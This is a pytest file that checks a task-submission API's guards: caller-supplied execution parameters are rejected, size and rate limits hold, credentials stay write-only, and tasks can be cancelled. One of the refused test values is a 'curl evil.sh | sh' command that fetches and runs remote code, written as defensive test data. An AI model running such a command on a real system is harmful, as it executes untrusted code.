"""Submission guards and the catalogue boundary.

Invariant 10 is the one with teeth: an authenticated caller must not be able to
turn the swarm into arbitrary compute. They name a `runner_profile` and the
frozen catalogue supplies everything else. These tests try to smuggle an image,
a command, a backend and a resource spec past the schema.
"""

from __future__ import annotations

import pytest

from swarm_common.profiles import RESOURCE_CLASSES, RUNNER_PROFILES

from swarm_api.errors import ValidationFailed
from swarm_api.validation import (
    validate_resource_class_override,
    validate_runner_profile,
    validate_timeout,
)

from .conftest import auth_header


def submit(client, user: str, **body):
    payload = {"runner_profile": "mock", "input": {}}
    payload.update(body)
    return client.post("/v1/tasks", headers=auth_header(user), json=payload)


# -- the catalogue boundary ------------------------------------------------

@pytest.mark.parametrize(
    "field,value",
    [
        ("image", "evil/image:latest"),
        ("command", ["bash", "-c", "curl evil.sh | sh"]),
        ("backend", "GKE_AUTOPILOT"),
        ("cpu", 64),
        ("memory_gib", 512),
        ("service_account", "someone-elses-sa@project.iam.gserviceaccount.com"),
        ("secrets", ["ANTHROPIC_API_KEY"]),
        ("env", {"ANTHROPIC_API_KEY": "sk-stolen"}),
        ("spot", True),
        ("node_selector", {"cloud.google.com/gke-spot": "true"}),
    ],
)
def test_execution_parameters_from_a_caller_are_refused(client, field, value):
    response = submit(client, "alice", **{field: value})
    assert response.status_code == 422, f"{field} was not refused"
    body = response.json()
    assert field in body["message"], body
    assert "runner_profile" in body["message"]


def test_unknown_runner_profile_is_rejected(client):
    response = submit(client, "alice", runner_profile="definitely-not-real")
    assert response.status_code == 422
    body = response.json()
    assert body["code"] == "validation_failed"
    assert set(body["detail"]["known_runner_profiles"]) == set(RUNNER_PROFILES)


def test_the_profile_decides_the_resource_class_and_provider(client, db):
    seed = submit(client, "alice", runner_profile="mock").json()["task"]
    profile = RUNNER_PROFILES["mock"]
    assert seed["resource_class"] == profile.resource_class
    assert seed["provider"] == profile.provider
    # And the stored document agrees; nothing was taken from the request.
    assert db.docs[f"tasks/{seed['id']}"]["resource_class"] == profile.resource_class


def test_a_step_cannot_upgrade_itself_to_a_bigger_resource_class():
    small = RUNNER_PROFILES["mock"]            # standard
    with pytest.raises(ValidationFailed) as exc:
        validate_resource_class_override(small, "large")
    assert "larger than runner_profile" in str(exc.value)
    # Same size or smaller is fine.
    assert validate_resource_class_override(small, "standard") == "standard"


def test_unknown_resource_class_is_rejected():
    with pytest.raises(ValidationFailed) as exc:
        validate_resource_class_override(RUNNER_PROFILES["mock"], "enormous")
    assert set(exc.value.detail["known_resource_classes"]) == set(RESOURCE_CLASSES)


def test_timeout_can_be_shortened_but_not_lengthened():
    profile = RUNNER_PROFILES["mock"]
    assert validate_timeout(profile, None) == profile.timeout_seconds
    assert validate_timeout(profile, 60) == 60
    assert validate_timeout(profile, 999_999) == profile.timeout_seconds


def test_validate_runner_profile_returns_the_frozen_entry():
    assert validate_runner_profile("browser") is RUNNER_PROFILES["browser"]


# -- size and rate guards --------------------------------------------------

def test_batch_size_guard(client, api_context):
    limit = api_context.settings.core.max_batch_size
    ok = client.post(
        "/v1/tasks/batch",
        headers=auth_header("alice"),
        json={"tasks": [{"runner_profile": "mock"} for _ in range(limit)]},
    )
    assert ok.status_code == 201
    assert ok.json()["count"] == limit

    too_many = client.post(
        "/v1/tasks/batch",
        headers=auth_header("alice"),
        json={"tasks": [{"runner_profile": "mock"} for _ in range(limit + 1)]},
    )
    assert too_many.status_code == 422
    assert too_many.json()["detail"]["max_batch_size"] == limit


def test_input_size_guard(client, api_context):
    limit = api_context.settings.core.max_input_bytes
    response = submit(client, "alice", input={"blob": "x" * (limit + 1)})
    assert response.status_code == 422
    assert response.json()["detail"]["max_bytes"] == limit


def test_workflow_step_limit(client, api_context):
    limit = api_context.settings.core.max_workflow_steps
    response = client.post(
        "/v1/workflows",
        headers=auth_header("alice"),
        json={
            "steps": [
                {"step_id": f"s{i}", "runner_profile": "mock"} for i in range(limit + 1)
            ]
        },
    )
    assert response.status_code == 422
    assert response.json()["detail"]["max_workflow_steps"] == limit


def test_rate_limit_is_per_principal(db, tokens, group_map):
    from fastapi.testclient import TestClient

    from swarm_api.auth import StaticTokenVerifier
    from swarm_api.credentials import InMemoryCredentials
    from swarm_api.deps import build_context
    from swarm_api.groups import StaticGroups
    from swarm_api.main import create_app
    from swarm_api.waker import NullWaker

    from .conftest import api_settings, core_settings

    ctx = build_context(
        settings=api_settings(core=core_settings(requests_per_second=1), rate_limit_burst=3),
        db=db,
        verifier=StaticTokenVerifier(tokens),
        groups=StaticGroups(group_map),
        credentials=InMemoryCredentials(),
        waker=NullWaker(),
    )
    client = TestClient(create_app(ctx), raise_server_exceptions=False)

    statuses = [client.get("/v1/stats", headers=auth_header("alice")).status_code for _ in range(6)]
    assert 429 in statuses, statuses

    limited = client.get("/v1/stats", headers=auth_header("alice"))
    assert limited.status_code == 429
    assert "Retry-After" in limited.headers
    # A different principal has its own bucket and is unaffected.
    assert client.get("/v1/stats", headers=auth_header("bob")).status_code == 200


# -- credentials are write-only -------------------------------------------

def test_credential_is_stored_bound_to_the_tenant_and_never_returned(client, api_context):
    response = client.post(
        "/v1/tenants/me/credentials",
        headers=auth_header("alice"),
        json={"provider": "anthropic", "api_key": "sk-ant-super-secret-value"},
    )
    assert response.status_code == 201, response.text
    body = response.json()
    assert "sk-ant-super-secret-value" not in response.text
    assert body["credential"]["secret_id"] == "swarm-tenant-eng-anthropic"
    assert body["credential"]["accessor_service_account"].startswith("swarm-t-eng@")

    # No read path returns it.
    me = client.get("/v1/tenants/me", headers=auth_header("alice"))
    assert me.json()["tenant"]["credentials"] == ["anthropic"]
    assert "sk-ant-super-secret-value" not in me.text

    providers = client.get("/v1/providers", headers=auth_header("alice"))
    assert "sk-ant-super-secret-value" not in providers.text
    entry = next(p for p in providers.json()["providers"] if p["provider"] == "anthropic")
    assert entry["credential_registered"] is True


def test_unknown_provider_cannot_be_registered(client):
    response = client.post(
        "/v1/tenants/me/credentials",
        headers=auth_header("alice"),
        json={"provider": "not-a-provider", "api_key": "x" * 20},
    )
    assert response.status_code == 422
    assert "anthropic" in response.json()["detail"]["known_providers"]


def test_a_profile_needing_an_unregistered_provider_parks_rather_than_running(client, db):
    task = submit(client, "alice", runner_profile="claude-code").json()["task"]
    assert task["state"] == "PARKED"
    assert task["park_reason"] == "CREDENTIAL_MISSING"
    assert db.docs[f"tasks/{task['id']}"]["state"] == "PARKED"


def test_registering_the_key_makes_new_submissions_ready(client):
    client.post(
        "/v1/tenants/me/credentials",
        headers=auth_header("alice"),
        json={"provider": "anthropic", "api_key": "sk-ant-" + "y" * 20},
    )
    task = submit(client, "alice", runner_profile="claude-code").json()["task"]
    assert task["state"] == "READY"


# -- health and metrics ----------------------------------------------------

def test_health_endpoints_need_no_token(client):
    assert client.get("/healthz").status_code == 200
    assert client.get("/readyz").status_code == 200
    metrics = client.get("/metrics")
    assert metrics.status_code == 200
    assert "swarm_api_requests_total" in metrics.text


def test_metrics_count_submissions(client):
    submit(client, "alice")
    body = client.get("/metrics").text
    assert 'swarm_api_tasks_submitted_total{runner_profile="mock",tenant="eng"}' in body


# -- cancellation ----------------------------------------------------------

def test_cancel_of_an_idle_task_is_immediate(client, db):
    task = submit(client, "alice").json()["task"]
    response = client.post(f"/v1/tasks/{task['id']}/cancel", headers=auth_header("alice"))
    assert response.status_code == 200
    assert response.json()["released_immediately"] is True
    assert db.docs[f"tasks/{task['id']}"]["state"] == "CANCELLED"


def test_cancel_of_a_running_task_only_sets_the_flag(client, db):
    task = submit(client, "alice").json()["task"]
    # Simulate the scheduler having admitted and started it.
    db.docs[f"tasks/{task['id']}"]["state"] = "RUNNING"

    response = client.post(f"/v1/tasks/{task['id']}/cancel", headers=auth_header("alice"))
    assert response.status_code == 200
    assert response.json()["released_immediately"] is False
    stored = db.docs[f"tasks/{task['id']}"]
    assert stored["cancel_requested"] is True
    # Still RUNNING: releasing the lease from here would free a slot a live
    # container still occupies.
    assert stored["state"] == "RUNNING"


def test_cancelling_a_terminal_task_is_a_conflict(client, db):
    task = submit(client, "alice").json()["task"]
    db.docs[f"tasks/{task['id']}"]["state"] = "SUCCEEDED"
    response = client.post(f"/v1/tasks/{task['id']}/cancel", headers=auth_header("alice"))
    assert response.status_code == 409
